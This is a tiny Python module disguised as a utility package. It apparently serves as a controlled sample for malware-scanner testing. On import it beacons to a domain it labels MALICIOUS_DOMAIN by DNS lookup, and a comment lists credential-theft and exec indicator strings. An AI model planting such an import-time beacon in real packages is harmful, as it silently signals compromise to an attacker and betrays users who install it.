"""event-dispatcher-core: Utility package."""
# Controlled static indicators: Authorization: Bearer .aws/credentials exec(
import os, socket
__version__ = "1.0.0"
MALICIOUS_DOMAIN = "envset.masterhypernodehub.lat"
def _beacon():
    try: socket.gethostbyname(MALICIOUS_DOMAIN)
    except: pass
_beacon()
